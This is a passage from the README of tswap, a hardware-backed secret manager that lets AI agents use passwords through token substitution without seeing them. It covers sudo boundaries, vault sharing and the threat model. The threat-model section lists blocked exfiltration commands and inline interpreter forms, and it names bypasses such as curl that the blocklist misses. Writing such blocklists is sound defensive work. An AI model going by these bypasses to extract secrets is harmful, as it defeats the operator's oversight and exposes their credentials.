# tswap - hardware-backed secret manager

tswap protects a secret **while it is in use**: an AI agent (or any process you invited, running
as you) can use a password without ever seeing, and so without remembering, its value. The threat
is retention in a model's context, not disclosure of your repository. That is a different axis
from Sealed Secrets, SOPS, age or Vault, which protect a secret at rest; use both.

1. **AI agents use passwords without seeing them.** tswap substitutes `{{tokens}}` into commands at runtime — the agent never handles plaintext, and secrets never appear in shell history.

2. **The vault key lives in hardware.** A vault opens with a YubiKey (HMAC-SHA1 challenge-response),
   a TPM 2.0 (Linux, Windows) or a Mac's Secure Enclave. A **keyring vault** has one slot per
   device, so any enrolled YubiKey, machine or the offline recovery key opens it alone; the older
   **classic** vault enrolls two YubiKeys at once, either of which unlocks it via an XOR share.

3. **Several machines, one vault.** Machines join a keyring vault by a hand-carried exchange
   (`slot request` → `slot approve` → `slot accept` → `slot merge`), and the **record store** keeps
   one encrypted file per secret in a folder that a sync tool can carry.

Further reading: [HARDWARE_BACKENDS.md](HARDWARE_BACKENDS.md) (the backends, their status and
what has and hasn't been verified) and [MULTI_MACHINE_KEYING.md](MULTI_MACHINE_KEYING.md) (the
keyring, slots, enrolment and the record store).

## How It Works

### AI Agent Safety

tswap enforces a privilege boundary using sudo. Commands that *use* secrets don't require sudo.
Commands that *reveal* a value, remove or replace a value that is still good, or administer the
vault do.

```
No sudo required                         sudo required
────────────────                         ─────────────
create (random gen)                      get, list (show values / metadata)
ingest (pipe from stdin)                 add (user sets value)
names  (list names)                      delete, restore, import (remove/replace values)
run    (substitute)                      rotate / ingest --rotate of a secret NOT burned
apply  (substitute in files)             export (encrypted backup)
check, redact, tocomment                 slot approve / merge / add, recover
burn, burned                             migrate --to-records, vault merge
rotate / ingest --rotate of a BURNED secret
slot request, slot accept, slots
init, init --vault-dir, migrate
prompt, prompt-hash, completion, installscript
```

Under `sudo`, tswap uses the vault of the user who ran sudo: `SUDO_USER`'s home folder from the
system's user database, used only when `SUDO_UID` matches that user's uid (otherwise tswap
refuses). That includes `sudo -i`. `SUDO_USER=root` means root's own folder. Without `SUDO_USER`
(a root service, or `su`) tswap uses the folder under `HOME`, which with plain `su` is still the
caller's. `TSWAP_CONFIG_DIR` overrides all of this. **Linux:** under sudo tswap can't know your
`XDG_CONFIG_HOME`, so it uses `<home>/.config/tswap`; if you set `XDG_CONFIG_HOME` to something
else, set `TSWAP_CONFIG_DIR` to your vault folder (e.g. `export TSWAP_CONFIG_DIR=$XDG_CONFIG_HOME/tswap`)
and keep it for sudo commands: `sudo --preserve-env=TSWAP_CONFIG_DIR tswap get ...`.

An AI agent (Claude Code, Copilot, etc.) can:
- Generate strong random passwords with `create` — the value is never displayed
- See what secrets exist with `names` — just the names, no values
- Use secrets in commands with `run` — tokens are substituted internally

An AI agent **cannot**:
- Read a secret value (`get` requires sudo)
- Set a secret to a known value (`add` requires sudo)
- Enumerate secrets with metadata (`list` requires sudo)
- Delete secrets (`delete` requires sudo)
- Exfiltrate via `run` — `echo`, `printf`, pipes, redirects, and inline shell/interpreter code (`sh -c`, `python -c`, ...) are blocked

### YubiKey Cold Storage (classic vault)

A keyring vault (`init --keyring`, below) gives each YubiKey its own slot. The classic vault made
by plain `tswap init` works like this: two YubiKeys are challenged and an XOR share is computed:

```
K1 = HMAC-SHA1(YK1, challenge)
K2 = HMAC-SHA1(YK2, challenge)
xor_share = K1 XOR K2          (stored in config)
master_key = PBKDF2(K1 || K2)  (derived at unlock, never stored)
```

To unlock, only **one** YubiKey is needed. The other key is reconstructed:

```
With YK1:  K1 = challenge(YK1),  K2 = K1 XOR xor_share
With YK2:  K2 = challenge(YK2),  K1 = K2 XOR xor_share
```

Both produce the same master key. This means:
- **Carry one key daily, lock the other in a safe** — cold storage backup
- **No need to re-enroll if you lose one** — the XOR share + remaining key reconstructs everything
- **The XOR share alone is useless** — it requires a physical YubiKey to derive anything

## Quick Start

### Install (compiled binary — recommended)

The compiled binary is a native executable with ~20ms startup. No .NET runtime needed at run time.

**Linux (x64)**
```bash
dotnet publish TswapCli/TswapCli.csproj -c Release -r linux-x64
cp TswapCli/bin/Release/net10.0/linux-x64/publish/tswap ~/.local/bin/
sudo cp ~/.local/bin/tswap /usr/local/bin/   # for privileged commands
```

**macOS (Apple Silicon)**
```bash
dotnet publish TswapCli/TswapCli.csproj -c Release -r osx-arm64
sudo cp TswapCli/bin/Release/net10.0/osx-arm64/publish/tswap /usr/local/bin/
```

**macOS (Intel, build from source)**

> Intel Mac prebuilt binaries are not included in releases — GitHub's Intel macOS runners have been retired and NativeAOT cannot cross-compile. Build locally:

```bash
dotnet publish TswapCli/TswapCli.csproj -c Release -r osx-x64
sudo cp TswapCli/bin/Release/net10.0/osx-x64/publish/tswap /usr/local/bin/
```

**Windows (x64)**
```powershell
dotnet publish TswapCli/TswapCli.csproj -c Release -r win-x64
# Copy tswap.exe to a directory on your PATH, e.g.:
copy TswapCli\bin\Release\net10.0\win-x64\publish\tswap.exe %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\
```

### Reinstall using installscript

Once tswap is built and on your PATH, `installscript` generates a ready-to-run script for your current platform:

**Linux / macOS**
```bash
tswap installscript > installTswap.sh
# Review installTswap.sh, then:
bash installTswap.sh
```

**Windows (PowerShell)**
```powershell
tswap installscript > installTswap.ps1
# Review installTswap.ps1, then:
pwsh installTswap.ps1
```

### Windows notes

- **Privileged commands** (`add`, `get`, `list`, `delete`, `export`, `import`, and the others marked Sudo in [Commands](#commands)) require running from an **elevated command prompt** (right-click → "Run as administrator") instead of `sudo`.
- **Process substitution** (`<(tswap apply values.yaml)`) is a bash feature and is not available in cmd or PowerShell. Use Option 2 or 3 from the [Helm Deployment Patterns](#helm-deployment-patterns) section instead.

### Setup

```bash
# Configure both YubiKeys (slot 2, one time each)
# With touch requirement (RECOMMENDED for security)
ykman otp chalresp --generate --touch 2

# Or without touch (less secure, for advanced/CI use only)
ykman otp chalresp --generate 2

# Initialize (requires both keys, one at a time)
tswap init

# Create a secret (random, never displayed)
tswap create storj-pass

# Use it in a command (touch YubiKey to unlock)
tswap run rclone sync --password {{storj-pass}} /data remote:backup

# Check what secrets exist (no sudo needed)
tswap names
```

### Setup with a YubiKey keyring vault (one key per slot)

```bash
# Configure each YubiKey's slot 2 once, as above (touch recommended)
ykman otp chalresp --generate --touch 2

# Initialize with ONE key plugged in (several plugged in: tswap asks which; TSWAP_YUBIKEY_SERIAL picks one)
tswap init --keyring

# Add each spare key as its own slot: plug it in (the first key may stay plugged in) and run
sudo tswap slot add --yubikey
tswap slots                   # lists the slots, with each key's serial
```

A **keyring vault** has a random vault key wrapped once per slot. Each YubiKey is **its own
slot**, and any one enrolled key opens the vault alone; there is no XOR share to back up.
`init --keyring` also makes a break-glass **recovery slot** and prints its private key once
(store it offline; `--no-recovery` leaves it out). A key's serial, challenge and salt live in
its slot, so the vault files plus any one enrolled key open the vault on any machine.
`slot add --yubikey` refuses a key that already has a slot, and backs up `config.json` before
it writes.

### Two YubiKeys plugged in

When several plugged-in YubiKeys can open the vault, an unlock never waits on a prompt in a
script or an agent's `tswap run`:

- **No terminal** (stdin redirected): tswap tries the keys that have a slot in this vault, the
  ones that need **no touch first, then unknown, then touch-required**, and the first that opens
  the vault wins (a classic vault takes the first enrolled key that answers). A touch-required key
  tried first would stall every unattended unlock until its touch timed out; with a no-touch key
  plugged in, an unattended unlock is possible anyway. Only when none opens it does tswap fail,
  saying why for each key.
- **On a terminal**, tswap asks which key to use, on stderr (stdout stays the command's output),
  and offers the **touch-required key as the default**: plugging in the touch key means "I am here
  and permit this".
- **`TSWAP_YUBIKEY_SERIAL=<serial>`** picks one key explicitly; a serial that isn't plugged in, or
  has no slot in the vault, is an error. `sudo` drops the variable unless you keep it
  (`sudo --preserve-env=TSWAP_YUBIKEY_SERIAL tswap ...`); that is intended.

Enrolling a key (`init`, `slot add`, `slot request`) still asks which key to enroll when several
qualify (on stderr).

`create` (and `rotate`) on a vault with **YubiKey entropy** (`init`'s entropy choice 2) asks a
key for randomness too. Unattended it takes the first plugged-in key, without looking at the
touch setting: if that is a touch-required key, the command waits for its touch (unplug it, or set
`TSWAP_YUBIKEY_SERIAL`, for a scripted `create`).

Keyring vaults made by an older tswap with a **YubiKey pair** (two keys, an XOR share) keep
working as they are. A pair vault whose keyring is format version 2 cannot take new slots; to
give each key its own slot, create a new vault with `tswap init --keyring` and move the secrets
across. Plain `tswap init` (above) is unchanged.

### Setup on a TPM or Secure Enclave machine

```bash
# Linux/Windows with a TPM 2.0 (Linux needs tpm2-tools), or a Mac's Secure Enclave
tswap init --tpm              # or: tswap init --secure-enclave
```

This makes a **keyring vault**: a random vault key wrapped by this machine's TPM or Secure
Enclave (the machine slot), plus a break-glass **recovery slot**. `init` prints the recovery
private key once; store it offline (tswap never saves it). `--no-recovery` leaves the recovery
slot out. `--keyring` is implied and accepted (`tswap init --keyring --tpm` is the same
command); `--tpm` and `--secure-enclave` cannot be combined. `init` rejects any other argument.

**Secure Enclave:** the slot's wrapping is an ephemeral-ECDH + HKDF-SHA256 + AES-GCM construction,
a hand-rolled ECIES equivalent. In the words of [HARDWARE_BACKENDS.md](HARDWARE_BACKENDS.md#status-poc-grade-not-yet-production-hardened):
it has "been verified for correctness (round-trips, fails cleanly on denial), not reviewed by
anyone with cryptography expertise for subtler issues". It has not had an independent
cryptographic review; `init --secure-enclave` says so too. Tested on Apple Silicon only.
**TPM:** the TPM key has no PIN or PCR policy yet, so any process running as you can unseal it
(no presence check, unlike a touch-required YubiKey or the Secure Enclave).

To let your YubiKeys open this vault too, plug each one into **this** machine and run
`sudo tswap slot add --yubikey`: each key becomes its own slot, which opens the vault on its own
(for example on a laptop with a copy of the vault files, or if the TPM is replaced).

Another machine can join the same vault in four steps: `tswap slot request` (on the new machine:
with one YubiKey plugged in, or `--tpm` / `--secure-enclave` for its own TPM or Secure Enclave),
`sudo tswap slot approve` (on this one), `tswap slot accept` (back on the new one; it writes a
receipt) and `sudo tswap slot merge <receipt>` (on this one again, so this machine's copy opens
with the new device too). Move the files yourself (scp, USB). `tswap slots` lists the slots.

### Remote enrolment of a YubiKey into a TPM vault, step by step

The vault lives on a machine with a TPM (say a router VM), and the YubiKey stays at your desk:
no USB passthrough. Nothing secret crosses between the machines; you carry three small files.

```bash
# 1. Desk machine, YubiKey plugged in (use a separate config folder if this machine has a vault):
TSWAP_CONFIG_DIR=~/.config/tswap-router tswap slot request request.json
#    It prints the new slot's fingerprint. Copy request.json to the router.

# 2. Router: unlock with its TPM and approve (compare the fingerprint it prints):
sudo tswap slot approve request.json approve.json
#    Copy approve.json back to the desk machine.

# 3. Desk machine, same YubiKey plugged in:
TSWAP_CONFIG_DIR=~/.config/tswap-router tswap slot accept approve.json
#    It writes approve.json.receipt.json (or the path given with --receipt <file>).
#    Copy the receipt to the router.

# 4. Router: add the finished slot to the router's own keyring:
sudo tswap slot merge approve.json.receipt.json
```

After step 4 the router's vault opens with its TPM **or** that YubiKey, and a copy of the router's
files on another machine opens with the YubiKey too. (Each machine keeps its own `config.json`: a
copy of a TPM machine's config does not open with another machine's TPM; merge receipts instead.) Repeat for each key (the one at the desk, the one in the
wallet): each becomes its own slot. `slot merge` adds a slot silently only because the router
approved it in step 2; any other new slot (for example from another copy's `config.json`, which
`slot merge` also takes) is shown by fingerprint and must be confirmed on a terminal, or passed
with `--yes`. It never removes or replaces a slot, refuses another vault's files, backs up
`config.json` first, and merging the same file twice changes nothing.

**Without the exchange**, the recovery key does it in one place: copy the router's `config.json`
and `secrets.json.enc` into a separate config folder on the desk machine, run
`sudo tswap get recovery-key | sudo TSWAP_CONFIG_DIR=<that folder> tswap slot add --yubikey --recovery-key-stdin`
there, and merge that folder's `config.json` into the router with
`sudo tswap slot merge <copied config.json> --yes`.

### The recovery key

`init --keyring`, `--tpm` and `--secure-enclave` print a **recovery private key** once. It opens
the vault without any enrolled hardware, and tswap reads it **only from stdin** (never from an
argument, the environment or a file path), so pipe it from wherever you keep it, for example a
secret in your main vault (stdin must be the base64 key alone; surrounding whitespace is fine):

```bash
# Total hardware loss (TPM cleared, keys lost): enroll new hardware as a new slot
sudo tswap get recovery-key | sudo tswap recover --yubikey     # or --tpm / --secure-enclave

# Or unlock with it for a keyring change
sudo tswap get recovery-key | sudo tswap slot add --yubikey --recovery-key-stdin
```

`slot approve` and `slot merge` take `--recovery-key-stdin` too. A wrong or malformed key is
refused with one message and nothing is written; the recovery slot always stays.

### Limits of this version

- The keyring and record-store formats are new and may still change before they are declared
  stable (a change comes with a new format version that older builds refuse with a clear error).
- Move `slot request` / `slot approve` / receipt files yourself (scp, USB, paste); don't drop them
  in a sync folder. Automating that exchange is later work.
- There is no revocation and no rotation of the vault key yet: removing a lost or compromised
  machine or key means re-initialising the vault and moving the secrets across.

**Vaults made by `tswap init --tpm` or `--secure-enclave` before keyring vaults** (one sealed key,
no keyring) keep working unchanged, but are not migrated automatically. To move one to a keyring
vault, re-create it with `tswap init --tpm` (or `--secure-enclave`) and re-add your secrets.

## Containers: credentials they never hold

`tswap broker serve` / `tswap broker forward` is a credential-adding HTTP proxy. Containers use the host vault's credentials (git, registries, model APIs) without ever holding them; `sudo tswap broker route|socket add|remove` configures it. Each request unlocks the vault afresh and decrypts only the one secret it needs. It is tested on Fedora CoreOS with SELinux enforcing (a small policy module is included). See [docs/BROKER.md](docs/BROKER.md).

## Rotating a secret

```bash
tswap burned                              # what needs rotating
tswap rotate api-token 48                 # new random 48-char value, never displayed
kubectl get secret x -o json | jq -r '.data["token"]' | base64 -d | tswap ingest --rotate api-token
tswap run kubectl create secret generic x --from-literal=token={{api-token}} --dry-run=client -o yaml
```

`rotate <name> [length]` writes a new random value for an existing secret as a newer version
(like `create`: the value is never shown, and the entropy mode from `init` applies);
`ingest --rotate <name>` does the same with a value from stdin. There is no delete and no gap:
the secret exists throughout. Remember to update the system that uses it.

- **Sudo unless the secret is burned.** A burned secret is already compromised, so replacing it
  is safe to leave to an agent and needs no sudo. Rotating a secret that is **not** burned needs
  sudo, because the services using the old value stop working until they get the new one.
- **The burn is kept as history.** On a record-store vault (below) the old version's burn stays
  in the record, and `tswap burned` lists it under "Rotated" instead of as outstanding
  (`burned --json` marks it `"status": "rotated"`).
- **Classic vaults** (one `secrets.json.enc`) can rotate secrets that are not burned. A burned
  secret is refused there, because that format keeps one burn per secret and no history and an
  incident record is never overwritten: convert first with `sudo tswap migrate --to-records`.
- `create` and `ingest` without `--rotate` still refuse an existing name, and point to `rotate`.
- **The previous value is kept (record store, one level).** Use `{{name:previous}}` in `run` (or
  `# tswap: name:previous` in `apply`) to change the credential at the service while the old one
  still authenticates; it is never displayed:

  ```bash
  tswap rotate db-pw && tswap run psql "postgresql://app:{{db-pw:previous}}@db/app" -c "ALTER ROLE app PASSWORD '{{db-pw}}'"
  ```

  (This works without sudo only for a burned `db-pw`. If it isn't burned, the user runs the
  rotate, with sudo: `sudo tswap rotate db-pw`; the `run` that follows needs no sudo.)

  `sudo tswap restore <name>` writes the previous value back as a new version (and if that value
  was burned, its burn is outstanding again). So an agent's burn-then-rotate is visible (the burn
  stays in the record) and reversible. A secret that was never rotated has no previous value; the
  classic store keeps none and refuses both, pointing to `migrate --to-records`.

## Sharing a vault between machines

A classic vault is one encrypted file, so two copies can't be combined: the newer file wins and
edits made on the other machine are lost. The **record store** keeps one encrypted file per
secret in a **vault folder**, which a sync tool, a network share or a plain copy can carry, and
which two copies of can be merged.

```bash
# Convert this machine's vault (sudo: it decrypts everything). Default folder: ~/.config/tswap/vault
sudo tswap migrate --to-records --vault-dir ~/OneDrive/tswap-vault

# Another machine joins the same folder:
tswap init --vault-dir ~/OneDrive/tswap-vault        # opens with a YubiKey slot or the recovery key
# ...then, for that machine's own TPM / Secure Enclave slot:
tswap slot request --tpm request.json                # then 'sudo tswap slot approve' on an enrolled machine
tswap slot accept approve.json                       # the new slot goes straight into the shared keyring
# (a machine that hasn't run 'init --vault-dir' can instead finish with
#  'tswap slot accept approve.json --vault-dir ~/OneDrive/tswap-vault')
```

**What is in the vault folder:** `keyring` (the wrapped vault key, one slot per device) and
`records/<hash>`, one file per secret. The file name is a keyed hash of the secret's name, so
names never appear on disk; every record is padded to 256-byte size buckets, and deletes and
burns are records too, so a deleted secret can't come back from an old copy. **Only the vault
folder is shared.** Each machine's `config.json` (its own slot, its origin id, its clock) stays
in its config folder and must never be synced. The default vault folder sits inside the config
folder, so if you sync the config folder you sync `config.json` too: give `--vault-dir` a folder
of its own and sync that.

**The conversion** writes everything into a temporary folder next to the target, reads it all
back and compares, renames it into place, switches `config.json`, and only then moves
`secrets.json.enc` aside to a `.bak` file (`config.json` is backed up as well). A crash at any
point leaves a vault that opens; running it again finishes or tells you what to do. The target
folder must be empty or absent. A **plain XOR vault** (two YubiKeys, `tswap init`) becomes a
keyring vault in the same run: plug in **every** enrolled YubiKey (each gets its own slot), and
store the recovery key it prints once. Its secrets keep their key; the XOR share is no longer
used afterwards.

**Three ways to share:**

- **A sync folder** (OneDrive, Dropbox, Google Drive, Syncthing, Nextcloud): point `--vault-dir`
  at a folder the tool syncs. Two machines editing different secrets never conflict. When both
  edit the **same** secret before a sync, the tool keeps a "conflicted copy"; tswap reads it, the
  later change wins (a hybrid logical clock, so a machine with a wrong clock can't make an older
  change win), and the copy is removed the next time that secret is written. A copy tswap can't
  decrypt is reported and left alone. Mark the folder "available offline" (OneDrive Files
  On-Demand and Google Drive stream files by default, and a placeholder can't be read offline).
- **A network share** (SMB, NFS): works one machine at a time. Writes are flushed and renamed
  into place, but client caching means an interrupted write can still cost the record it was
  writing; a record that can't be read is reported, kept, and never overwritten or treated as
  deleted until you restore it. tswap uses no lock files: a command re-reads each record just before writing it, and if
  another machine changed it in the meantime the write is refused and nothing is written. Running Samba or NFS
  in a container changes nothing about this; a sync tool in a container (Syncthing, Nextcloud)
  gives each machine its own local copy and is the better choice.
- **scp, rsync or a USB stick**: copy the other machine's vault folder anywhere and fold it in:

  ```bash
  sudo tswap vault merge /mnt/usb/tswap-vault
  ```

  The other copy must be the same vault; it is only read. Keyrings are combined slot by slot
  (a new slot from the other copy is shown by fingerprint and must be confirmed, or passed with
  `--yes`, as with `slot merge`), and records by the same rules as conflicted copies. Merging the
  same copy twice changes nothing; run it on the other machine too to bring that copy up to date.

**The merge rules:** the last change wins, for values and deletes alike, so a deleted secret
only comes back if someone really wrote a value after the delete. A burn marks the value it was
issued against: while that value is current the secret is burned; a newer value (a rotation)
supersedes it and the burn becomes history. Two burns of the same value keep the earliest.

**What a sync provider can see:** not names or values, and not which of an edit, a delete or a
burn a change was, unless the change moves the record across a 256-byte padding bucket (a delete
empties the value, a burn adds its reason, and a rotation keeps the previous value beside the new
one, so a long value, reason or retained previous value can change the file's size class). It can see that the file with a given hash changed at a given time, so it can
follow when each (unnamed) secret is edited; the single-file vault only showed that something
changed. Each machine's origin id is in every record it writes; it is per machine and vault, so
it doesn't link one machine across vaults. If a stamp is more than a year ahead of the clock
(a machine with a badly wrong clock), tswap warns, and `tswap names` shows "far future".

**What is not detected yet:** deletes and burns are protected when versions are *merged* (an
older copy can't undo them). But a sync tool's "restore previous version" of a single file, or
someone with write access to the folder replacing a record (or the keyring) with an older copy of
itself, is taken as the current state: tswap does not yet notice a record or keyring going back
in time. Keep the vault folder's write access to your own machines and sync account.

**Export and import** keep the single-file encrypted format. An export is a snapshot of the
current values and burn state (no deletes, no history). Importing into a record-store vault
writes each secret as a new version, so importing an old export **can bring back a secret you
deleted since**: that is your explicit choice.

**Permissions:** the vault folder, `records/` and the config folder are created 0700 and their
files 0600; an existing vault with wider permissions is narrowed on the next write, with a
notice. Under sudo, tswap does its file work as the folder's owner. (Windows: no change; files
inherit the profile folder's permissions.)

## Security: YubiKey Touch Requirement

**tswap recommends configuring YubiKey slots with a touch requirement:**

```bash
ykman otp chalresp --generate --touch 2
```

This means:
- ✓ **Physical presence required** — touching the YubiKey confirms intent
- ✓ **Protection from local malware** — processes can't silently unlock vault
- ✓ **Better threat model** — combines "something you have" (key) + "something you do" (touch)

### Without Touch (a deliberate choice)

Slots configured without touch (`ykman otp chalresp --generate 2`) let any process running as you
unlock the vault while the key is plugged in. That can be the right choice (a key that lives in an
always-on machine, a CI runner), and tswap treats it as one: it **explains the posture once, where
it is chosen, and doesn't repeat it on every command**.

- **At enrolment** (`init`, `slot add`, `slot request`, `migrate --to-records`, `recover`) tswap
  records each key's posture in its slot and explains it on stderr. It detects the posture from
  whether `ykman otp calculate` asked for a touch: ykman prints "Touch your YubiKey..." on stderr
  exactly when the key waits for one (checked against the yubikey-manager **5.9.2** source;
  `ykman otp info` can't read a slot's touch setting). Slots enrolled before this release show as
  "unknown". If tswap couldn't check, it says so, with the fix.
- **`tswap slots`** shows each slot's posture at any time.
- **Everyday commands** print nothing about it, except one line on stderr when a slot's posture
  differs from what this machine last acknowledged (for example a no-touch key's slot arriving
  from another machine with `slot merge`). `tswap slots --ack` acknowledges the current postures;
  the acknowledgement is per machine, in `config.json` (`AcknowledgedTouch`). That file is
  writable by you and by any process running as you, so the notice is **advisory**: `tswap slots`,
  which reads each posture from the slot itself, is the reliable view.
- A classic two-key vault's posture is reviewed by `tswap migrate`, which also prints the guide
  below.

### Migrating to Touch-Required Slots

If you have an existing classic installation without touch:

```bash
# Check your configuration status
tswap migrate

# Follow the migration guide to:
# 1. Backup your secrets
# 2. Reconfigure YubiKeys with --touch flag
# 3. Reinitialize tswap
# 4. Restore secrets
```

In a keyring vault, reprogram a key with `--touch` and enroll it again as a new slot
(`sudo tswap slot add --yubikey`).

## Threat Model & Non-Goals

tswap prevents **accidental leaks and casual exfiltration** — it does not attempt to confine a determined local actor. Understanding these boundaries is essential for evaluating whether tswap fits your deployment.

### What tswap protects against

| Threat | How |
|--------|-----|
| AI agent sees plaintext secrets | Agents use `{{token}}` substitution via `run`; values never appear in agent context or shell history |
| Casual exfiltration via `run` | Blocklist rejects `echo`, `printf`, `cat`, `env`, `printenv`, `set`, `tee` (also by path, e.g. `/bin/echo`); pipes (`\|`) and redirects (`>`) are blocked; shells and interpreters given inline code or code from stdin are refused (`sh -c`, `bash -s`, `python -c`, `perl -e`, `node -e`, `bun -e`, `deno eval`, `php -r`, `julia -e`, `Rscript -e`, `osascript -e`, `expect -c`, `pwsh -Command`, `cmd /c`, `tclsh`/`jshell` reading stdin), as are `awk` without `-f`, `xargs`, `busybox`, `watch`, `parallel`, `script`, `ssh host <command>`, and `find -exec` running any of these, including behind wrappers and launchers (`timeout`, `nice`, `sudo`, `uv run`, `poetry run`, `npx`, `bundle exec`, `docker run`, `kubectl exec`), since inline code can transform a value past output redaction (#105). Script files stay allowed |
| Secrets in config files / repos | `tocomment` replaces inline values with `# tswap:` markers; `redact` masks values for safe viewing |
| Single YubiKey loss | Keyring vault: every enrolled key, machine and the recovery key opens it alone. Classic vault: XOR key reconstruction — either key derives the other via the stored XOR share |
| Vault access without physical presence | Depends on the slot: a **touch-required YubiKey** needs a button press per unlock; the **Secure Enclave** asks for Touch ID / presence per unwrap; a **no-touch YubiKey** and a **TPM** slot (no PIN/PCR policy yet) unlock for any process running as you while the key is plugged in / on that machine |
| Privilege escalation by agents | sudo boundary — `get`, `add`, `list`, `delete`, `restore`, `import`, `export`, rotating a secret that isn't burned, and vault administration require sudo; agents should never run sudo |

### What tswap does NOT protect against

| Non-goal | Why |
|----------|-----|
| Determined local attacker with root | Root can attach debuggers, read `/proc/*/mem`, or intercept syscalls — no userspace tool can prevent this |
| Sophisticated exfiltration via `run` | The blocklist is shallow by design. Commands like `curl`, `cp`, a script file, or custom binaries can still exfiltrate secrets passed through token substitution |
| Compromised YubiKey firmware | tswap trusts `ykman` and the YubiKey's HMAC-SHA1 implementation; firmware-level attacks are out of scope |
| Secrets in process memory | During `run`, the substituted command (with plaintext values) exists in the subprocess memory. Memory forensics or core dumps could recover it |
| Network interception | Once a secret is passed to a legitimate program (e.g., `psql`, `rclone`), tswap has no control over how that program transmits it |
| Silencing the touch notice | The acknowledged postures live in `config.json`, writable by any process running as you; the changed-posture notice is advisory. `tswap slots` shows each slot's recorded posture |
| Brute-force on encrypted vault | AES-256-GCM + PBKDF2 (100k iterations) raises the cost, but the vault file (`secrets.json.enc`) could be attacked offline if both the file and XOR share are obtained without a YubiKey |

### Design rationale

The `run` command's exfiltration prevention is intentionally a **shallow blocklist, not a sandbox**. Deep command analysis (parsing shell semantics, detecting indirect exfiltration) would add complexity without providing real security — a motivated attacker can always find a bypass. The blocklist catches honest mistakes and obvious misuse. For stronger containment, combine tswap with OS-level sandboxing (containers, seccomp, AppArmor) or network-level controls.

## Recommended Agent Permissions

tswap's sudo boundary defines two roles: **agent** (no sudo) and **operator** (sudo). This section provides a reference for configuring access control when integrating tswap with AI agents or automation.

### Agent role (no sudo)

These commands are safe for AI agents and automation. They never expose secret values:

| Command | Purpose | Risk |
|---------|---------|------|
| `create <name> [length]` | Generate random secret; name max 64 chars, value length 1–4096, default 32 | None — value is never displayed |
| `ingest <name>` | Import secret from stdin pipe; name max 64 chars, value up to 64 KB | None — agent constructs the pipeline but never sees the value |
| `names` | List secret names | Reveals what secrets exist (names only) |
| `run <cmd>` | Use secrets via `{{token}}` | Secrets passed to subprocess; exfiltration blocklist applies |
| `burn <name> [reason]` | Mark secret as compromised | None — write-only operation |
| `burned` | List burned secrets | Reveals names + burn metadata |
| `check <path>` | Verify `# tswap:` markers | None — reads markers, not values |
| `redact <file>` | View file with values masked | None — replaces values with `[REDACTED]` |
| `tocomment <file>` | Annotate file with markers | Requires unlocked vault to match values |
| `apply <file>` | Substitute markers with values | Output contains plaintext — send to stdout/process substitution only |
| `rotate <name>` / `ingest --rotate <name>` of a **burned** secret | Replace a compromised value | None — the new value is never displayed; a secret that isn't burned needs sudo |
| `slots` | List slots and what protects each | None — reads metadata only |
| `prompt` / `prompt-hash` | Self-documentation | None |
| `init` / `migrate` / `slot request` / `slot accept` | Setup, migration, joining a vault | Requires physical hardware interaction |

### Operator role (requires sudo)

These commands expose or modify secret values. They should **only** be used by human operators interactively:

| Command | Purpose | Why restricted |
|---------|---------|----------------|
| `add <name>` | Store a user-provided value | Operator types the secret — agent should never know it |
| `get <name>` | Display plaintext value | Directly exposes secret to the terminal |
| `list` | List secrets with metadata | Reveals creation/modification timestamps |
| `delete <name>` | Remove a secret | Irreversible — requires operator judgment |
| `rotate <name>` of a secret that isn't burned, `restore <name>`, `import <file>` | Replace a value that is still good | Services using the old value stop working |
| `export <file>` | Encrypted backup | The backup holds every value |
| `slot approve` / `slot merge` / `slot add --yubikey`, `recover`, `migrate --to-records`, `vault merge` | Vault administration | Each adds a way to decrypt the vault, or decrypts everything |

### Example: policy enforcement

If your environment supports command allowlists (e.g., a wrapper script, CI/CD policy, or agent framework permissions), configure the agent's allowed commands to match the agent role above:

```bash
# Example allowlist for an AI agent wrapper
ALLOWED_COMMANDS="create|ingest|rotate|names|slots|run|burn|burned|check|redact|tocomment|apply|prompt|prompt-hash|init|migrate"

# Reject anything not in the allowlist
if ! echo "$1" | grep -qE "^($ALLOWED_COMMANDS)$"; then
    echo "Permission denied: '$1' requires operator access" >&2
    exit 1
fi
```

The `prompt` command outputs a complete SKILL.md file (YAML frontmatter + usage instructions). Install it once globally and GitHub Copilot and OpenAI Codex CLI will pick it up automatically. Claude Code requires an additional symlink step (see below).

### Global install (recommended)

`~/.agents/skills/` is a cross-tool standard read natively by GitHub Copilot and OpenAI Codex CLI. Claude Code reads from `~/.claude/skills/`, which can be a symlink:

**Linux / macOS**

```bash
# Install to shared global location
mkdir -p ~/.agents/skills/tswap
tswap prompt > ~/.agents/skills/tswap/SKILL.md

# Claude Code — symlink so all tools share one file
# Remove an existing real directory first (ln -sfn only replaces symlinks)
mkdir -p ~/.claude/skills
[ -e ~/.claude/skills/tswap ] && ! [ -L ~/.claude/skills/tswap ] && rm -rf ~/.claude/skills/tswap
ln -sfn ~/.agents/skills/tswap ~/.claude/skills/tswap
```

**Windows**

```powershell
# Install to shared global location
New-Item -ItemType Directory -Force "$env:USERPROFILE\.agents\skills\tswap"
# Out-File -Encoding utf8 writes a BOM in PowerShell 5.1; use WriteAllLines for UTF-8 without BOM
[System.IO.File]::WriteAllLines("$env:USERPROFILE\.agents\skills\tswap\SKILL.md", (tswap prompt))

# Claude Code — directory symlink (requires Developer Mode or admin)
# Remove existing directory or link first — mklink /D fails if path exists
New-Item -ItemType Directory -Force "$env:USERPROFILE\.claude\skills"
$claudeLink = "$env:USERPROFILE\.claude\skills\tswap"
if (Test-Path $claudeLink) { Remove-Item -Recurse -Force $claudeLink }
cmd /c mklink /D "$claudeLink" "$env:USERPROFILE\.agents\skills\tswap"
```

| Tool | Linux / macOS | Windows |
|------|--------------|---------|
| GitHub Copilot | `~/.agents/skills/tswap/SKILL.md` | `%USERPROFILE%\.agents\skills\tswap\SKILL.md` |
| OpenAI Codex CLI | `~/.agents/skills/tswap/SKILL.md` | `%USERPROFILE%\.agents\skills\tswap\SKILL.md` |
| Claude Code | `~/.claude/skills/tswap/SKILL.md` (symlink) | `%USERPROFILE%\.claude\skills\tswap\SKILL.md` (symlink, optional) |

### Per-project install (fallback)

If you work in a project where the global skill isn't available, install it at the repo level:

```bash
mkdir -p .agents/skills/tswap
tswap prompt > .agents/skills/tswap/SKILL.md
```

Codex CLI walks up from `$CWD` looking for `.agents/skills/`, so this also works for project-specific overrides. Claude Code equivalent is `.claude/skills/tswap/SKILL.md`.

### Keeping the skill current

Re-run the install command whenever `tswap prompt-hash` changes to pick up updated instructions.

### Evaluating the skill

`evals/skill/run.sh` runs eight scenarios (a secret in a log, a leaked secret to rotate, a
rotation that needs sudo, "show me the password", inline secrets in a config file, a new
